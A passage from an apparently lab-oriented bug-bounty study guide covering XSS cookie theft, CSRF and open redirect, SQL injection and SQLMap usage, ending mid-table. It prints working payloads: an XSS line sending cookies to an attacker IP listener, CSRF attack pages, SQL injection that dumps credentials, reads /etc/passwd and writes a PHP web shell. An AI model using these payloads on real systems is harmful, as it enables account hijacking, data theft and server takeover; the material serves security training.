HTTPS.</p>"},{"location":"bug-bounty-guide/session-security/#obtaining-session-cookies-via-xss-netcat-edition","title":"Obtaining session cookies via XSS (Netcat edition)","text":"<ul> <li>example payload JavaScript<pre><code>&lt;h1 onmouseover='document.write(`&lt;img src=\"http://&lt;VPN/TUN Adapter IP&gt;:8000?cookie=${btoa(document.cookie)}\"&gt;`)'&gt;test&lt;/h1&gt;\n// or \n&lt;script&gt;fetch(`http://&lt;VPN/TUN Adapter IP&gt;:8000?cookie=${btoa(document.cookie)}`)&lt;/script&gt;\n</code></pre></li> <li>listener Bash<pre><code>nc -nlvp 8000\n</code></pre></li> <li>cookie will arrive b64 encoded because the btoa() function was used.</li> </ul>"},{"location":"bug-bounty-guide/session-security/#cross-site-request-forgery-csrf-or-xsrf","title":"Cross-Site Request Forgery (CSRF or XSRF)","text":"<p>A web application is vulnerable to CSRF attacks when: - All the parameters required for the targeted request can be determined or guessed by the attacker - The application's session management is solely based on HTTP cookies, which are automatically included in browser requests</p> <p>To successfully exploit a CSRF vulnerability, we need: - To craft a malicious web page that will issue a valid (cross-site) request impersonating the victim - The victim to be logged into the application at the time when the malicious cross-site request is issued</p>"},{"location":"bug-bounty-guide/session-security/#example_1","title":"Example","text":"<ul> <li>Make a change (update profile etc)</li> <li>Intercept request</li> <li>Check for presence of anti-CSRF token</li> <li>Create a HTML file based on the form being filled out (reference): HTML<pre><code>&lt;html&gt;\n  &lt;body&gt;\n    &lt;form id=\"submitMe\" action=\"http://xss.htb.net/api/update-profile\" method=\"POST\"&gt;\n      &lt;input type=\"hidden\" name=\"email\" value=\"attacker@htb.net\" /&gt;\n      &lt;input type=\"hidden\" name=\"telephone\" value=\"&amp;#40;227&amp;#41;&amp;#45;750&amp;#45;8112\" /&gt;\n      &lt;input type=\"hidden\" name=\"country\" value=\"CSRF_POC\" /&gt;\n      &lt;input type=\"submit\" value=\"Submit request\" /&gt;\n    &lt;/form&gt;\n    &lt;script&gt;\n      document.getElementById(\"submitMe\").submit()\n    &lt;/script&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre></li> <li>serve the form Bash<pre><code>python -m http.server 1337\n</code></pre></li> <li>Visit the served page in a new tab <code>http://&lt;VPN/TUN Adapter IP&gt;:1337/notmalicious.html</code></li> <li>Check original page to see if details have updated</li> </ul>"},{"location":"bug-bounty-guide/session-security/#cross-site-request-forgery-get-based","title":"Cross-Site Request Forgery (GET-based)","text":"<ul> <li>inspect get request with burp etc <code>GET /app/save/julie.rogers@example.com?telephone=%28834%29-609-2003&amp;country=United+States&amp;csrf=d33c0908672c32d7a3a6bc1700ee65983b57c688&amp;email=julie.rogers%40example.com&amp;action=save HTTP/1.1</code></li> <li>create and serve corresponding HTML page: HTML<pre><code>&lt;!-- save as notmalicious_get.html --&gt;\n&lt;html&gt;\n  &lt;body&gt;\n    &lt;form id=\"submitMe\" action=\"http://csrf.htb.net/app/save/julie.rogers@example.com\" method=\"GET\"&gt;\n      &lt;input type=\"hidden\" name=\"email\" value=\"attacker@htb.net\" /&gt;\n      &lt;input type=\"hidden\" name=\"telephone\" value=\"&amp;#40;227&amp;#41;&amp;#45;750&amp;#45;8112\" /&gt;\n      &lt;input type=\"hidden\" name=\"country\" value=\"CSRF_POC\" /&gt;\n      &lt;input type=\"hidden\" name=\"action\" value=\"save\" /&gt;\n      &lt;input type=\"hidden\" name=\"csrf\" value=\"30e7912d04c957022a6d3072be8ef67e52eda8f2\" /&gt;\n      &lt;input type=\"submit\" value=\"Submit request\" /&gt;\n    &lt;/form&gt;\n    &lt;script&gt;\n      document.getElementById(\"submitMe\").submit()\n    &lt;/script&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> Bash<pre><code>python -m http.server 1337\n</code></pre></li> <li>whilst user is still logged in visit <code>http://&lt;VPN/TUN Adapter IP&gt;:1337/notmalicious_get.html</code></li> <li>refresh profile page to see if updates have taken effect</li> </ul>"},{"location":"bug-bounty-guide/session-security/#cross-site-request-forgery-post-based","title":"Cross-Site Request Forgery (POST-based)","text":"<ul> <li>can abuse reflected URL values</li> <li>set up netcat listener Bash<pre><code>nc -nlvp 8000\n</code></pre></li> <li>visit <code>http://csrf.htb.net/app/delete/%3Ctable background='%2f%2f&lt;VPN/TUN Adapter IP&gt;:8000%2f</code> where <code>%3Ctable background='%2f%2f&lt;VPN/TUN Adapter IP&gt;:8000%2f</code> is the reflected part</li> <li>listener should record the csrf token which can be used for post requests</li> </ul>"},{"location":"bug-bounty-guide/session-security/#xss-csrf-chaining","title":"XSS &amp; CSRF Chaining","text":"<ul> <li>In this example we change the profiles visibility</li> <li>Use the below script to recreate changing the profiles visibility JavaScript<pre><code>&lt;script&gt;\nvar req = new XMLHttpRequest();\nreq.onload = handleResponse; // triggers the handle response function on page load\nreq.open('get','/app/change-visibility',true); // get request for the change visibility page\nreq.send();\nfunction handleResponse(d) {\n    var token = this.responseText.match(/name=\"csrf\" type=\"hidden\" value=\"(\\w+)\"/)[1]; // locates the csrf token\n    var changeReq = new XMLHttpRequest(); \n    changeReq.open('post', '/app/change-visibility', true); // creates post request\n    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); // sets the header\n    changeReq.send('csrf='+token+'&amp;action=change'); // uses the previously aquired anti-csrf token and changes profile visibility\n};\n&lt;/script&gt;\n</code></pre></li> <li>Enter the script into a field vulnerable to XSS and update the profile</li> <li>Now when a different user visits that persons public profile the script will be executed and their profile visibility will change</li> </ul>"},{"location":"bug-bounty-guide/session-security/#exploiting-weak-csrf-tokens","title":"Exploiting Weak CSRF Tokens","text":"<ul> <li>Check if hashing user names etc result in the csrf token</li> <li>Create a malicious page like below HTML<pre><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n\n&lt;head&gt;\n    &lt;meta charset=\"UTF-8\"&gt;\n    &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"&gt;\n    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;\n    &lt;meta name=\"referrer\" content=\"never\"&gt;\n    &lt;title&gt;Proof-of-concept&lt;/title&gt;\n    &lt;link rel=\"stylesheet\" href=\"styles.css\"&gt;\n    &lt;script src=\"./md5.min.js\"&gt;&lt;/script&gt;\n&lt;/head&gt;\n\n&lt;body&gt;\n    &lt;h1&gt; Click Start to win!&lt;/h1&gt;\n    &lt;button class=\"button\" onclick=\"trigger()\"&gt;Start!&lt;/button&gt;\n\n    &lt;script&gt;\n        let host = 'http://csrf.htb.net'\n\n        function trigger(){\n            // Creating/Refreshing the token in server side.\n            window.open(`${host}/app/change-visibility`)\n            window.setTimeout(startPoc, 2000)\n        }\n\n        function startPoc() {\n            // Setting the username\n            let hash = md5(\"crazygorilla983\")\n\n            window.location = `${host}/app/change-visibility/confirm?csrf=${hash}&amp;action=change`\n        }\n    &lt;/script&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre></li> <li>and the corresponding md5.min.js script JavaScript<pre><code>!function(n){\"use strict\";function d(n,t){var r=(65535&amp;n)+(65535&amp;t);return(n&gt;&gt;16)+(t&gt;&gt;16)+(r&gt;&gt;16)&lt;&lt;16|65535&amp;r}function f(n,t,r,e,o,u){return d((u=d(d(t,n),d(e,u)))&lt;&lt;o|u&gt;&gt;&gt;32-o,r)}function l(n,t,r,e,o,u,c){return f(t&amp;r|~t&amp;e,n,t,o,u,c)}function g(n,t,r,e,o,u,c){return f(t&amp;e|r&amp;~e,n,t,o,u,c)}function v(n,t,r,e,o,u,c){return f(t^r^e,n,t,o,u,c)}function m(n,t,r,e,o,u,c){return f(r^(t|~e),n,t,o,u,c)}function c(n,t){var r,e,o,u;n[t&gt;&gt;5]|=128&lt;&lt;t%32,n[14+(t+64&gt;&gt;&gt;9&lt;&lt;4)]=t;for(var c=1732584193,f=-271733879,i=-1732584194,a=271733878,h=0;h&lt;n.length;h+=16)c=l(r=c,e=f,o=i,u=a,n[h],7,-680876936),a=l(a,c,f,i,n[h+1],12,-389564586),i=l(i,a,c,f,n[h+2],17,606105819),f=l(f,i,a,c,n[h+3],22,-1044525330),c=l(c,f,i,a,n[h+4],7,-176418897),a=l(a,c,f,i,n[h+5],12,1200080426),i=l(i,a,c,f,n[h+6],17,-1473231341),f=l(f,i,a,c,n[h+7],22,-45705983),c=l(c,f,i,a,n[h+8],7,1770035416),a=l(a,c,f,i,n[h+9],12,-1958414417),i=l(i,a,c,f,n[h+10],17,-42063),f=l(f,i,a,c,n[h+11],22,-1990404162),c=l(c,f,i,a,n[h+12],7,1804603682),a=l(a,c,f,i,n[h+13],12,-40341101),i=l(i,a,c,f,n[h+14],17,-1502002290),c=g(c,f=l(f,i,a,c,n[h+15],22,1236535329),i,a,n[h+1],5,-165796510),a=g(a,c,f,i,n[h+6],9,-1069501632),i=g(i,a,c,f,n[h+11],14,643717713),f=g(f,i,a,c,n[h],20,-373897302),c=g(c,f,i,a,n[h+5],5,-701558691),a=g(a,c,f,i,n[h+10],9,38016083),i=g(i,a,c,f,n[h+15],14,-660478335),f=g(f,i,a,c,n[h+4],20,-405537848),c=g(c,f,i,a,n[h+9],5,568446438),a=g(a,c,f,i,n[h+14],9,-1019803690),i=g(i,a,c,f,n[h+3],14,-187363961),f=g(f,i,a,c,n[h+8],20,1163531501),c=g(c,f,i,a,n[h+13],5,-1444681467),a=g(a,c,f,i,n[h+2],9,-51403784),i=g(i,a,c,f,n[h+7],14,1735328473),c=v(c,f=g(f,i,a,c,n[h+12],20,-1926607734),i,a,n[h+5],4,-378558),a=v(a,c,f,i,n[h+8],11,-2022574463),i=v(i,a,c,f,n[h+11],16,1839030562),f=v(f,i,a,c,n[h+14],23,-35309556),c=v(c,f,i,a,n[h+1],4,-1530992060),a=v(a,c,f,i,n[h+4],11,1272893353),i=v(i,a,c,f,n[h+7],16,-155497632),f=v(f,i,a,c,n[h+10],23,-1094730640),c=v(c,f,i,a,n[h+13],4,681279174),a=v(a,c,f,i,n[h],11,-358537222),i=v(i,a,c,f,n[h+3],16,-722521979),f=v(f,i,a,c,n[h+6],23,76029189),c=v(c,f,i,a,n[h+9],4,-640364487),a=v(a,c,f,i,n[h+12],11,-421815835),i=v(i,a,c,f,n[h+15],16,530742520),c=m(c,f=v(f,i,a,c,n[h+2],23,-995338651),i,a,n[h],6,-198630844),a=m(a,c,f,i,n[h+7],10,1126891415),i=m(i,a,c,f,n[h+14],15,-1416354905),f=m(f,i,a,c,n[h+5],21,-57434055),c=m(c,f,i,a,n[h+12],6,1700485571),a=m(a,c,f,i,n[h+3],10,-1894986606),i=m(i,a,c,f,n[h+10],15,-1051523),f=m(f,i,a,c,n[h+1],21,-2054922799),c=m(c,f,i,a,n[h+8],6,1873313359),a=m(a,c,f,i,n[h+15],10,-30611744),i=m(i,a,c,f,n[h+6],15,-1560198380),f=m(f,i,a,c,n[h+13],21,1309151649),c=m(c,f,i,a,n[h+4],6,-145523070),a=m(a,c,f,i,n[h+11],10,-1120210379),i=m(i,a,c,f,n[h+2],15,718787259),f=m(f,i,a,c,n[h+9],21,-343485551),c=d(c,r),f=d(f,e),i=d(i,o),a=d(a,u);return[c,f,i,a]}function i(n){for(var t=\"\",r=32*n.length,e=0;e&lt;r;e+=8)t+=String.fromCharCode(n[e&gt;&gt;5]&gt;&gt;&gt;e%32&amp;255);return t}function a(n){var t=[];for(t[(n.length&gt;&gt;2)-1]=void 0,e=0;e&lt;t.length;e+=1)t[e]=0;for(var r=8*n.length,e=0;e&lt;r;e+=8)t[e&gt;&gt;5]|=(255&amp;n.charCodeAt(e/8))&lt;&lt;e%32;return t}function e(n){for(var t,r=\"0123456789abcdef\",e=\"\",o=0;o&lt;n.length;o+=1)t=n.charCodeAt(o),e+=r.charAt(t&gt;&gt;&gt;4&amp;15)+r.charAt(15&amp;t);return e}function r(n){return unescape(encodeURIComponent(n))}function o(n){return i(c(a(n=r(n)),8*n.length))}function u(n,t){return function(n,t){var r,e=a(n),o=[],u=[];for(o[15]=u[15]=void 0,16&lt;e.length&amp;&amp;(e=c(e,8*n.length)),r=0;r&lt;16;r+=1)o[r]=909522486^e[r],u[r]=1549556828^e[r];return t=c(o.concat(a(t)),512+8*t.length),i(c(u.concat(t),640))}(r(n),r(t))}function t(n,t,r){return t?r?u(t,n):e(u(t,n)):r?o(n):e(o(n))}\"function\"==typeof define&amp;&amp;define.amd?define(function(){return t}):\"object\"==typeof module&amp;&amp;module.exports?module.exports=t:n.md5=t}(this);\n//# sourceMappingURL=md5.min.js.map\n</code></pre></li> <li>serve the page  Bash<pre><code>python -m http.server 1337\n</code></pre></li> <li>Now send the victim the malicious link <code>http://&lt;VPN/TUN Adapter IP&gt;:1337/press_start_2_win.html</code></li> <li>If they visit it and click the start button while logged in to their profile it will be made public</li> </ul>"},{"location":"bug-bounty-guide/session-security/#additional-csrf-protection-bypasses","title":"Additional CSRF Protection Bypasses","text":"<ul> <li>Try making the CSRF token a null value (empty) <code>CSRF-Token:</code></li> <li>Set the CSRF token value to the same length as the original CSRF token but with a different/random value</li> <li>Use the same CSRF token across accounts (if the app does not validate that the csrf token is tied to a specific account)</li> <li>Try changning the request method (POST to GET etc)</li> <li>Delete the tokens whole key value pair and send request</li> <li>If server simply checks that cookie and request parameter match (double-submit) use session fixation or: HTTP<pre><code>POST /change_password\nCookie: CSRF-Token=fixed_token;\nPOST body:\nnew_password=pwned&amp;CSRF-Token=fixed_token\n</code></pre></li> <li>Remove referer header if that is the protection used, add <code>&lt;meta name=\"referrer\" content=\"no-referrer\"&gt;</code> to your page hosting the csrf script</li> <li>Bypass referer regex, if it uses target.com as a whitelist, try using the target domain as follows www.target.com.pwned.m3, www.pwned.m3?www.target.com or www.pwned.m3/www.target.com</li> </ul>"},{"location":"bug-bounty-guide/session-security/#open-redirect","title":"Open Redirect","text":"<ul> <li>Possible when the legitimate application's redirection functionality does not perform any kind of validation</li> <li>Specify a website under their control in a redirection URL of a legitimate website</li> <li>Pass this URL to the victim</li> <li>Example vulnerable redirect code PHP<pre><code>$red = $_GET['url'];\nheader(\"Location: \" . $red);\n</code></pre></li> <li>Can be manipulated by send <code>trusted.site/index.php?url=https://evil.com</code> to the victim</li> <li>Other URL parameters to check for:</li> <li>?url=</li> <li>?link=</li> <li>?redirect=</li> <li>?redirecturl=</li> <li>?redirect_uri=</li> <li>?return=</li> <li>?return_to=</li> <li>?returnurl=</li> <li>?go=</li> <li>?goto=</li> <li>?exit=</li> <li>?exitpage=</li> <li>?fromurl=</li> <li>?fromuri=</li> <li>?redirect_to=</li> <li>?next=</li> <li>?newurl=</li> <li>?redir=</li> </ul> <p>#### Example</p> <ul> <li>Navigating to <code>http://oredirect.htb.net</code> results in <code>http://oredirect.htb.net/?redirect_uri=/complete.html&amp;token=&lt;RANDOM TOKEN ASSIGNED BY THE APP&gt;</code></li> <li>Start a netcat listener</li> <li>Edit URL to <code>http://oredirect.htb.net/?redirect_uri=http://&lt;VPN/TUN Adapter IP&gt;:PORT&amp;token=&lt;RANDOM TOKEN ASSIGNED BY THE APP&gt;</code> and send to the victim</li> <li>Netcat listener will capture the request and the users reset token</li> </ul>"},{"location":"bug-bounty-guide/sql-injection-fundamentals/","title":"SQL Injection","text":""},{"location":"bug-bounty-guide/sql-injection-fundamentals/#types-of-sql-injection","title":"Types of SQL Injection","text":"Type Description Example Useful/Where Can't Be Used Classic Direct injection into input fields <code>' OR '1'='1</code> Useful for basic input fields; can't use if input is sanitized Union-Based Uses UNION operator to extract data <code>' UNION SELECT NULL, username, password --</code> Useful with multiple columns; can't use if UNION is blocked Error-Based Exploits database errors to reveal data <code>' AND 1=(SELECT COUNT(*))</code> Useful with error messages; can't use if errors are suppressed Blind (Boolean) Infers data via true/false responses <code>' AND SUBSTRING(version(), 1, 1)=5</code> Useful when errors are suppressed; can't use if responses are identical Blind (Time-Based) Delays response based on conditions <code>' OR IF(1=1, SLEEP(5), 0)</code> Useful with no output; can't use if timing controls are strict Stacked Queries Executes multiple statements <code>'; DROP TABLE users; --</code> Useful if multi-queries allowed; can't use if DBMS restricts it"},{"location":"bug-bounty-guide/sql-injection-fundamentals/#useful-links","title":"Useful links","text":"<ul> <li>MySQL Documentation</li> <li>Data types</li> <li>MariaDB Documentation</li> </ul>"},{"location":"bug-bounty-guide/sql-injection-fundamentals/#mysql","title":"MySQL","text":""},{"location":"bug-bounty-guide/sql-injection-fundamentals/#general","title":"General","text":"Command Description <code>mysql -u root -h docker.hackthebox.eu -P 3306 -p</code> Login to mysql database. No space after -p when entering password <code>CREATE DATABASE users;</code> Create a new datase called users <code>SHOW DATABASES;</code> List available databases <code>USE users;</code> Switch to database <p>Note: SQL statements are not case sensitive but names are.</p> <p>Note: 3306 is the default port for MySQL.</p>"},{"location":"bug-bounty-guide/sql-injection-fundamentals/#tables","title":"Tables","text":"Command Description <code>CREATE TABLE logins (id INT, ...);</code> Add a new table <code>SHOW TABLES;</code> List available tables in current database <code>DESCRIBE logins;</code> Show table properties and columns <code>INSERT INTO table_name VALUES (value_1,..);</code> Add values to table, requires values for all columns in the table <code>INSERT INTO table_name(username, password) VALUES ('john', 'john123!');</code> Add values to specific columns in a table Note: skipping columns with the 'NOT NULL' constraint will result in an error (unless AUTO_INCREMENT) <code>INSERT INTO logins(username, password) VALUES ('john', 'john123!'), ('tom', 'tom123!');</code> Insert multiple records at once by separating them with a comma <code>UPDATE logins SET password = 'change_password' WHERE id &gt; 1;</code> Update specific records"},{"location":"bug-bounty-guide/sql-injection-fundamentals/#create-table-example","title":"Create table example","text":"SQL<pre><code>CREATE TABLE logins (\n    id INT NOT NULL AUTO_INCREMENT, -- set to auto increment\n    username VARCHAR(100) UNIQUE NOT NULL, -- must be unique and cannot be left blank\n    password VARCHAR(100),\n    date_of_joining DATETIME DEFAULT NOW(), -- default value will be when the entry is added\n    PRIMARY KEY (id) -- makes the id column the primary key\n    );\n</code></pre>"},{"location":"bug-bounty-guide/sql-injection-fundamentals/#columns","title":"Columns","text":"Command Description <code>SELECT * FROM table_name;</code> Show all columns in a table <code>SELECT username, password FROM table_name;</code> Show specific columns in a table <code>DROP TABLE logins;</code> Delete a table <code>ALTER TABLE logins ADD newColumn INT;</code> Add new column <code>ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn;</code> Rename column <code>ALTER TABLE logins MODIFY oldColumn DATE;</code> Change column datatype <code>ALTER TABLE logins DROP oldColumn;</code> Delete column"},{"location":"bug-bounty-guide/sql-injection-fundamentals/#output","title":"Output","text":"Command Description <code>SELECT * FROM logins ORDER BY password;</code> Sort by column (ascending by default) <code>SELECT * FROM logins ORDER BY password DESC;</code> Sort by column in descending order <code>SELECT * FROM logins ORDER BY password DESC, id ASC;</code> Sort by two-columns, by id for duplicate password entries <code>SELECT * FROM logins LIMIT 2;</code> Only show first two results <code>SELECT * FROM logins LIMIT 1, 2;</code> Only show first two results starting from index 2 (1 being the offset in this example) <code>SELECT * FROM logins WHERE id &gt; 1;</code> List results that meet a condition <code>SELECT * FROM logins WHERE username LIKE 'admin%';</code> List results where the name is similar to a given string <code>SELECT * FROM logins WHERE username like '___';</code> Where username is exactly 3 chars, '_' = 1 char <code>SELECT last_name FROM employees WHERE first_name LIKE 'Bar%' AND hire_date='1990-01-01';</code> Last name of the employee whose first name starts with Bar and was hired on 1990-01-01 <code>SELECT COUNT(*) FROM titles WHERE emp_no &gt; 10000 OR title NOT LIKE '%engineer%';</code> The number of all records where the employee number is greater than 10000 or the employee title does not contain the string engineer"},{"location":"bug-bounty-guide/sql-injection-fundamentals/#mysql-operator-precedence","title":"MySQL Operator Precedence","text":"<ul> <li>Division (/), Multiplication (*), and Modulus (%)</li> <li>Addition (+) and Subtraction (-)</li> <li>Comparison (=, &gt;, &lt;, &lt;=, &gt;=, !=, LIKE)</li> <li>NOT (!)</li> <li>AND (&amp;&amp;)</li> <li>OR (||)</li> </ul>"},{"location":"bug-bounty-guide/sql-injection-fundamentals/#sql-injection_1","title":"SQL Injection","text":""},{"location":"bug-bounty-guide/sql-injection-fundamentals/#example-mysql-query-in-php","title":"Example MySQL query in php","text":"<p>Query: PHP<pre><code>$conn = new mysqli(\"localhost\", \"root\", \"password\", \"users\");\n$searchInput =  $_POST['findUser'];\n$query = \"select * from logins where username like '%$searchInput'\";\n$result = $conn-&gt;query($query);\n</code></pre></p> <p>Printing results: PHP<pre><code>while($row = $result-&gt;fetch_assoc() ){\n    echo $row[\"name\"].\"&lt;br&gt;\";\n}\n</code></pre></p> <p>For the above example entering <code>1'; DROP TABLE users;--</code> would result in:</p> SQL<pre><code>select * from logins where username like '%1'; DROP TABLE users;--'\n</code></pre>"},{"location":"bug-bounty-guide/sql-injection-fundamentals/#types-of-injection","title":"Types of Injection","text":"Type Description Use Case In-band: Union-Based Direct output via UNION query in specific column When output is displayed in a readable column In-band: Error-Based Triggers SQL errors to reveal query output When errors are shown on front-end Blind: Boolean-Based Uses true/false conditions to infer data When no output but page behavior changes Blind: Time-Based Delays response with Sleep() to infer data When no output or behavior change, but delays detectable Out-of-band Sends output to remote location (e.g., DNS) When no direct output is accessible <p>Note: In some cases, we may have to use the URL encoded version of the payload. An example of this is when we put our payload directly in the URL 'i.e. HTTP GET request'.</p>"},{"location":"bug-bounty-guide/sql-injection-fundamentals/#sql-injection-payloads-url-encoding","title":"SQL Injection Payloads URL Encoding","text":"Payload URL Encoded ' %27 \" %22 # %23 ; %3B ) %29 - %2D = %3D"},{"location":"bug-bounty-guide/sql-injection-fundamentals/#auth-bypass-payloads","title":"Auth Bypass Payloads","text":"<p>MySQL evaluates AND before OR, so a query with an OR and a TRUE condition (e.g., <code>'1'='1</code>) returns TRUE. Use <code>admin' or '1'='1</code> to bypass authentication by ensuring the query evaluates to TRUE while balancing quotes.</p> Payload Description How It Works <code>'</code> Single quote SQLi check May return error message <code>admin' or '1'='1</code> Basic Auth Bypass (works if admin is a valid username) Appends TRUE condition (<code>'1'='1</code>) to bypass login check Username:<code>notadmin' or '1'='1</code> Password: <code>something' or '1'='1</code> Basic Auth Bypass (works when username not known) This works since the query evaluate to true irrespective of the username or password <code>admin')-- -</code> Basic Auth Bypass With Comments Closes query early with <code>)</code> and comments out rest with <code>--</code>, the additional <code>-</code> ensures the comments are activited by forcing a space after them <p>Payload all the things: authentication bypass section</p> <p>Note:  Line comments with <code>--</code> or <code>#</code>, in-line comment with <code>/**/</code>.</p>"},{"location":"bug-bounty-guide/sql-injection-fundamentals/#union-injection","title":"Union Injection","text":"<p>Union Clause</p> Payload Description <code>' order by 1-- -</code> Detect number of columns using order by, increment the integer until error states column does not exist <code>cn' UNION select 1,2,3-- -</code> Detect number of columns using Union injection, try a different numbers of columns until we get a success, using numbers as junk data will show which columns are displayed, however data type must match, NULL matches all data types <code>cn' UNION select 1,@@version,3,4-- -</code> Basic Union injection to show DB version, with 'cn' as search query <code>' UNION SELECT 1,user(),3,4-- -</code> Basic Union injection to show which user we are making the query as <code>' UNION select username, 2, 3, 4 from passwords-- -</code> Union injection for 4 columns to get username from the passwords table"},{"location":"bug-bounty-guide/sql-injection-fundamentals/#db-enumeration","title":"DB Enumeration","text":""},{"location":"bug-bounty-guide/sql-injection-fundamentals/#mysql-fingerprinting","title":"MySQL Fingerprinting","text":"Payload When to Use Expected Output Wrong Output <code>SELECT @@version</code> Full query output MySQL Version (e.g., 10.3.22-MariaDB-1ubuntu1) MSSQL returns MSSQL version; errors in others. <code>SELECT POW(1,1)</code> Numeric output only 1 Errors in other DBMS. <code>SELECT SLEEP(5)</code> Blind/No output Delays response 5 seconds, returns 0 No delay in other DBMS. Payload Description <code>cn' UNION select 1,database(),3,4-- -</code> Current database name <code>cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -</code> List all databases (mysql, information_schema and performance_schema are default MySQLdatabases ) <code>cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -</code> List all tables in a specific database <code>cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -</code> List all columns in a specific table <code>cn' UNION select 1, username, password, 4 from dev.credentials-- -</code> Dump data from a table in another database"},{"location":"bug-bounty-guide/sql-injection-fundamentals/#privileges","title":"Privileges","text":"Payload Description <code>cn' UNION SELECT 1, user(), 3, 4-- -</code> or <code>cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -</code> Find current user <code>cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user=\"root\"-- -</code> Find if \"root\" user has admin privileges <code>cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee=\"'root'@'localhost'\"-- -</code> Show all of the \"root\" user's privileges, \"FILE\" privilege allows the user to read files <code>cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name=\"secure_file_priv\"-- -</code> Find which directories can be accessed through MySQL. If \"variable_value\" is empty then we can read/write files to any location"},{"location":"bug-bounty-guide/sql-injection-fundamentals/#write-file-privileges","title":"Write File Privileges","text":"<p>To be able to write files to the back-end server using a MySQL database, we require three things:</p> <ul> <li>User with FILE privilege enabled</li> <li>MySQL global secure_file_priv variable not enabled</li> <li>Write access to the location we want to write to on the back-end server</li> </ul>"},{"location":"bug-bounty-guide/sql-injection-fundamentals/#file-injection","title":"File Injection","text":"Payload Description <code>cn' UNION SELECT 1, LOAD_FILE(\"/etc/passwd\"), 3, 4-- -</code> Read local file <code>cn' UNION SELECT 1, LOAD_FILE(\"/var/www/html/search.php\"), 3, 4-- -</code> Another read local file example, useful to see how backend queries are handled <code>cn' UNION select 1,'file written successfully!',3,4 INTO OUTFILE '/var/www/html/proof.txt'-- -</code> Write a string to a local file <code>cn' UNION SELECT \"\",'&lt;?php system($_REQUEST[0]); ?&gt;', \"\", \"\" INTO OUTFILE '/var/www/html/shell.php'-- -</code> Write a web shell into the base web directory <p>Note: Web shells must be written to the base web directory for the web server (i.e. web root). Use load_file to read the server configuration at /etc/apache2/apache2.conf, /etc/nginx/nginx.conf or %WinDir%\\System32\\Inetsrv\\Config\\ApplicationHost.config are a few examples. Could also run a fuzzing scan and try to write files to different possible web roots, using Linux wordlist or Windows wordlist. We can also use server errors to possibly display the web root.</p>"},{"location":"bug-bounty-guide/sqlmap-essentials/","title":"SQLMap Essentials Cheat Sheet","text":""},{"location":"bug-bounty-guide/sqlmap-essentials/#beustq","title":"BEUSTQ","text":"<p>BEUSTQ is SQLMap's default technique setting, representing SQLi types: </p> <ul> <li>B (Boolean-based blind)</li> <li>E (Error-based)</li> <li>U (Union query-based)</li> <li>S (Stacked queries)</li> <li>T (Time-based blind)</li> <li>Q (Inline queries).</li> </ul>"},{"location":"bug-bounty-guide/sqlmap-essentials/#sql-injection-types","title":"SQL Injection Types","text":"Type Description Example Key Points Boolean-Based Blind Infers data via true/false responses. <code>AND 1=1</code> Useful with no output; slow, character-by-character. Error-Based Triggers errors to reveal data. <code>AND GTID_SUBSET(@@version,0)</code> Fast for chunks; requires visible errors. Union Query-Based Appends results with UNION. <code>UNION ALL SELECT 1,@@version,3</code> Fastest with direct output; needs column match. Stacked Queries Executes multiple statements. <code>; DROP TABLE users</code> For non-query statements; DBMS-specific. Time-Based Blind Delays response for inference. <code>AND 1=IF(2&gt;1,SLEEP(5),0)</code> Useful with no response change; slower due to delays. Inline Queries Embeds query within original. <code>SELECT (SELECT @@version) from</code> Uncommon; for specific app structures."},{"location":"bug-bounty-guide/sqlmap-essentials/#commands","title":"Commands","text":"<p>SQLMap wiki</p> <p>Note: SQLMap, by default, targets only the HTTP parameters, it is possible to test the headers, specify the \"custom\" injection mark after the header's value (e.g. --cookie=\"id=1*\").</p> Command Description <code>sqlmap -h</code> View the basic help menu <code>sqlmap -hh</code> View the advanced help menu <code>sqlmap -u \"http://www.example.com/vuln.php?id=1\" --batch</code> Run SQLMap without asking for user input, id will be tested <code>sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'</code> Run SQLMap with request headers, use copy as curl in developer tools and replace <code>curl</code> with <code>sqlmap</code> <code>sqlmap 'http://www.example.com/' --data 'uid=1&amp;name=test'</code> SQLMap with POST request, uid and name will be tested <code>sqlmap 'http://www.example.com/' --data 'uid=1*&amp;name=test'</code> POST request specifying an injection point with an asterisk, can be used within saved request file also <code>sqlmap -r req.txt</code> Passing an HTTP request file to SQLMap, right-click the request within Burp and choose Copy to file or Copy &gt; Copy Request Headers in browser (can use JSON formatted and XML formatted HTTP requests, copy raw request from network tab in dev tools) <code>sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'</code> Specifying a cookie header <code>sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'</code> Specifying a cookie header <code>sqlmap -u \"http://www.example.com/?id=1\" --random-agent</code> Randomly select a User-agent header value or use <code>--mobile</code> switch to imitate the smartphone <code>sqlmap -u www.target.com --data='id=1' --method PUT</code> Specifying a PUT request <code>sqlmap -u \"http://www.target.com/vuln.php?id=1\" --batch -t /tmp/traffic.txt</code> Store traffic to an output file <code>sqlmap -u \"http://www.target.com/vuln.php?id=1\" -v 6 --batch</code> Specify verbosity level <code>sqlmap -u \"www.example.com/?q=test\" --prefix=\"%'))\" --suffix=\"-- -\"</code> Specifying a prefix or suffix <code>sqlmap -u www.example.com/?id=1 -v 3 --level=5 --risk=3</code> Specifying the level (boundaries used) and risk (vectors 